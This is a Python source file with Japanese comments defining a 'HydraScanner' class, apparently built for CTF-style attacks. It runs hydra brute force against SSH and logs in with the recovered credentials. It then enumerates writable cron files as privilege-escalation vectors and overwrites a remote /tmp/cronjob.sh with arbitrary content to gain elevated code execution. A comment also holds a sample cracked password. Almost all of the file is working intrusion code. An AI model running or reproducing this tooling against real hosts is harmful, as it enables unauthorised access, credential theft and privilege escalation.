import asyncio
from typing import Dict, List, Optional
import re
import paramiko
import socket

class HydraScanner:
    """hydraを使用してブルートフォース攻撃を実行するスキャナー"""

    def __init__(self):
        # タイムアウトや並列実行数などのデフォルト設定
        self.timeout = 30
        self.tasks = 4

    async def _execute_ssh_command(self, ssh_client: paramiko.SSHClient, command: str, timeout: int = 10) -> str:
        """SSHクライアントでコマンドを実行し、結果を返します。"""
        try:
            stdin, stdout, stderr = ssh_client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            return output if output else error
        except Exception as e:
            return f"Error executing command '{command}': {str(e)}"

    async def _check_cron_privilege_escalation(self, ssh_client: paramiko.SSHClient) -> str:
        """cronジョブの権限昇格の可能性をチェックします。"""
        results = []
        results.append("🔍 CRON ANALYSIS SUMMARY")
        results.append("=" * 30)
        
        # 重要な情報のみを収集
        current_user = await self._execute_ssh_command(ssh_client, "whoami")
        writable_cron = await self._execute_ssh_command(ssh_client, "find /etc/cron* -type f -writable 2>/dev/null || echo 'No writable cron files found'")
        
        # カスタムcronジョブの確認
        custom_cron = await self._execute_ssh_command(ssh_client, "grep -v '^#' /etc/crontab | grep -v '^$' | grep -v 'run-parts' || echo 'No custom cron jobs'")
        
        # 重要なcronファイルの確認
        important_cron_files = await self._execute_ssh_command(ssh_client, "ls -la /etc/cron.d/ 2>/dev/null | grep -v '^d' | grep -v 'total' || echo 'No cron.d files'")
        
        # /tmp/cronjob.shファイルの確認
        tmp_cronjob = await self._execute_ssh_command(ssh_client, "ls -la /tmp/cronjob.sh 2>/dev/null || echo 'No /tmp/cronjob.sh found'")
        
        results.append(f"👤 Current User: {current_user}")
        
        # カスタムcronジョブがある場合のみ表示
        if "No custom cron jobs" not in custom_cron:
            results.append(f"📅 Custom Cron Jobs:\n{custom_cron}")
        
        # 書き込み可能なcronファイルがある場合のみ表示
        if "No writable cron files found" not in writable_cron:
            results.append(f"⚠️ Writable Cron Files:\n{writable_cron}")
        
        # 重要なcronファイルがある場合のみ表示
        if "No cron.d files" not in important_cron_files:
            results.append(f"📁 Important Cron Files:\n{important_cron_files}")
        
        # /tmp/cronjob.shファイルがある場合のみ表示
        if "No /tmp/cronjob.sh found" not in tmp_cronjob:
            results.append(f"📄 /tmp/cronjob.sh:\n{tmp_cronjob}")
            # ファイルの内容も確認
            cronjob_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh 2>/dev/null || echo 'Cannot read file'")
            results.append(f"📝 Content:\n{cronjob_content}")
        
        # 権限昇格の可能性を簡潔に評価
        if "No writable cron files found" not in writable_cron:
            results.append("\n🚨 PRIVILEGE ESCALATION POSSIBLE!")
            results.append("• Found writable cron files")
            results.append("• Can potentially modify cron jobs")
        else:
            results.append("\n✅ No obvious privilege escalation vectors found")
        
        return "\n".join(results)

    async def ssh_edit_cronjob(self, target: str, username: str, password: str, new_content: str, port: int = 22) -> str:
        """SSH接続後に/tmp/cronjob.shファイルを直接編集します。"""
        
        try:
            # SSHクライアントを作成
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # 接続タイムアウトを設定
            ssh_client.connect(
                hostname=target,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            try:
                # 現在のファイル内容を確認
                current_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh 2>/dev/null || echo 'File does not exist'")
                
                if "File does not exist" in current_content:
                    # ファイルが存在しない場合は新規作成
                    create_result = await self._execute_ssh_command(ssh_client, f"echo '{new_content}' > /tmp/cronjob.sh")
                    chmod_result = await self._execute_ssh_command(ssh_client, "chmod +x /tmp/cronjob.sh")
                    
                    # 作成結果を確認
                    final_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh")
                    file_info = await self._execute_ssh_command(ssh_client, "ls -la /tmp/cronjob.sh")
                    
                    ssh_client.close()
                    
                    return f"""✅ SUCCESS: /tmp/cronjob.sh created and edited!

📄 File Information:
{file_info}

📝 New Content:
{final_content}

💡 The file has been created with executable permissions."""
                    
                else:
                    # ファイルが存在する場合は上書き
                    backup_result = await self._execute_ssh_command(ssh_client, "cp /tmp/cronjob.sh /tmp/cronjob.sh.backup")
                    edit_result = await self._execute_ssh_command(ssh_client, f"echo '{new_content}' > /tmp/cronjob.sh")
                    
                    # 編集結果を確認
                    final_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh")
                    file_info = await self._execute_ssh_command(ssh_client, "ls -la /tmp/cronjob.sh")
                    
                    ssh_client.close()
                    
                    return f"""✅ SUCCESS: /tmp/cronjob.sh edited!

📄 File Information:
{file_info}

📝 New Content:
{final_content}

💾 Backup created: /tmp/cronjob.sh.backup

💡 The file has been successfully updated."""
                    
            except Exception as e:
                ssh_client.close()
                return f"""❌ FAILED: Error editing /tmp/cronjob.sh

🔧 Error: {str(e)}

💡 Please check file permissions and try again."""
                
        except paramiko.AuthenticationException:
            return f"""❌ FAILED: Authentication failed

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

💡 The username or password is incorrect."""
            
        except paramiko.SSHException as e:
            return f"""❌ FAILED: SSH connection error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🔧 Error: {str(e)}"""
            
        except socket.timeout:
            return f"""❌ FAILED: Connection timeout

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

⏱️ The connection timed out after {self.timeout} seconds."""
            
        except socket.gaierror:
            return f"""❌ FAILED: Host not found

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🌐 The host '{target}' could not be resolved."""
            
        except Exception as e:
            return f"""❌ FAILED: Unexpected error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🚨 Error: {str(e)}"""

    async def ssh_view_cronjob(self, target: str, username: str, password: str, port: int = 22) -> str:
        """SSH接続後に/tmp/cronjob.shファイルの内容を表示します。"""
        
        try:
            # SSHクライアントを作成
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # 接続タイムアウトを設定
            ssh_client.connect(
                hostname=target,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            # ファイルの存在確認
            file_exists = await self._execute_ssh_command(ssh_client, "test -f /tmp/cronjob.sh && echo 'exists' || echo 'not found'")
            
            if "exists" in file_exists:
                # ファイル情報と内容を取得
                file_info = await self._execute_ssh_command(ssh_client, "ls -la /tmp/cronjob.sh")
                file_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh")
                
                ssh_client.close()
                
                return f"""📄 /tmp/cronjob.sh File Information:

{file_info}

📝 File Content:
{file_content}"""
                
            else:
                ssh_client.close()
                return "❌ File not found: /tmp/cronjob.sh does not exist."
                
        except paramiko.AuthenticationException:
            return f"""❌ FAILED: Authentication failed

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

💡 The username or password is incorrect."""
            
        except paramiko.SSHException as e:
            return f"""❌ FAILED: SSH connection error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🔧 Error: {str(e)}"""
            
        except socket.timeout:
            return f"""❌ FAILED: Connection timeout

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

⏱️ The connection timed out after {self.timeout} seconds."""
            
        except socket.gaierror:
            return f"""❌ FAILED: Host not found

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🌐 The host '{target}' could not be resolved."""
            
        except Exception as e:
            return f"""❌ FAILED: Unexpected error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🚨 Error: {str(e)}"""

    async def ssh_login_test(self, target: str, username: str, password: str, port: int = 22) -> str:
        """指定のIDとPasswordを使用してSSHログインを試します。"""
        
        try:
            # SSHクライアントを作成
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # 接続タイムアウトを設定
            ssh_client.connect(
                hostname=target,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            # 接続が成功した場合、基本的な情報を取得
            try:
                # ホスト名を取得
                hostname = await self._execute_ssh_command(ssh_client, 'hostname')
                
                # 現在のユーザーを取得
                current_user = await self._execute_ssh_command(ssh_client, 'whoami')
                
                # システム情報を取得
                system_info = await self._execute_ssh_command(ssh_client, 'uname -a')
                
                # 基本情報の結果
                basic_info = f"""✅ SUCCESS: SSH login successful!

🔐 Login Details:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

📋 System Information:
  - Hostname: {hostname}
  - Current User: {current_user}
  - System: {system_info}

💡 The credentials are valid and you can now execute commands on the target system."""
                
                ssh_client.close()
                
                return basic_info
                
            except Exception as e:
                ssh_client.close()
                return f"""✅ SUCCESS: SSH login successful!

🔐 Login Details:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

⚠️ Note: Login successful but could not retrieve system information.
Error: {str(e)}"""
                
        except paramiko.AuthenticationException:
            return f"""❌ FAILED: Authentication failed

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

💡 The username or password is incorrect."""
            
        except paramiko.SSHException as e:
            return f"""❌ FAILED: SSH connection error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🔧 Error: {str(e)}"""
            
        except socket.timeout:
            return f"""❌ FAILED: Connection timeout

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

⏱️ The connection timed out after {self.timeout} seconds."""
            
        except socket.gaierror:
            return f"""❌ FAILED: Host not found

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🌐 The host '{target}' could not be resolved."""
            
        except Exception as e:
            return f"""❌ FAILED: Unexpected error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🚨 Error: {str(e)}"""

    async def ssh_cron_investigation(self, target: str, username: str, password: str, port: int = 22) -> str:
        """SSH接続後にcronジョブの詳細調査を実行します。"""
        
        try:
            # SSHクライアントを作成
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # 接続タイムアウトを設定
            ssh_client.connect(
                hostname=target,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            # cron権限昇格の分析を実行
            cron_analysis = await self._check_cron_privilege_escalation(ssh_client)
            
            ssh_client.close()
            
            return cron_analysis
                
        except paramiko.AuthenticationException:
            return f"""❌ FAILED: Authentication failed

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

💡 The username or password is incorrect."""
            
        except paramiko.SSHException as e:
            return f"""❌ FAILED: SSH connection error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🔧 Error: {str(e)}"""
            
        except socket.timeout:
            return f"""❌ FAILED: Connection timeout

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

⏱️ The connection timed out after {self.timeout} seconds."""
            
        except socket.gaierror:
            return f"""❌ FAILED: Host not found

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🌐 The host '{target}' could not be resolved."""
            
        except Exception as e:
            return f"""❌ FAILED: Unexpected error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🚨 Error: {str(e)}"""

    async def ssh_brute_force(self, target: str, port: int, username: str, password_list_path: str) -> str:
        """SSHに対してパスワードリスト攻撃を実行します。"""

        # hydraコマンドを安全なリスト形式で構築
        cmd_parts = [
            "hydra",
            "-t", str(self.tasks),
            "-W", str(self.timeout),
            "-l", username,
            "-P", password_list_path,
            f"ssh://{target}:{port}"
        ]

        # サブプロセスとしてhydraコマンドを実行
        process = await asyncio.create_subprocess_exec(
            *cmd_parts,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()
        
        output = stdout.decode('utf-8', errors='ignore').strip()
        error_output = stderr.decode('utf-8', errors='ignore').strip()

        # hydraの出力を解析してパスワードを見つける
        # 例: [22][ssh] host: 10.10.13.152   login: lin   password: RedDr@gonSyn9ic47e
        password_pattern = re.compile(r'password:\s*(.*)')
        found_password = None
        
        for line in output.splitlines():
            if "host:" in line and "login:" in line and "password:" in line:
                match = password_pattern.search(line)
                if match:
                    found_password = match.group(1).strip()
                    break
        
        if found_password:
            return f"✅ SUCCESS: Password found!\n  - Host: {target}\n  - Port: {port}\n  - User: {username}\n  - Password: {found_password}"
        elif process.returncode != 0:
            return f"❌ FAILED: hydra command failed.\nError: {error_output or output}"
        else:
            return "❌ FAILED: Password not found in the provided list."

    async def get_status(self) -> str:
        """Hydra Scannerの状態確認"""
        # hydraがインストールされているか簡単なチェック
        process = await asyncio.create_subprocess_shell("hydra -h", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        await process.communicate()
        if process.returncode == 0:
            return "Available"
        else:
            return "Not available (hydra command not found)"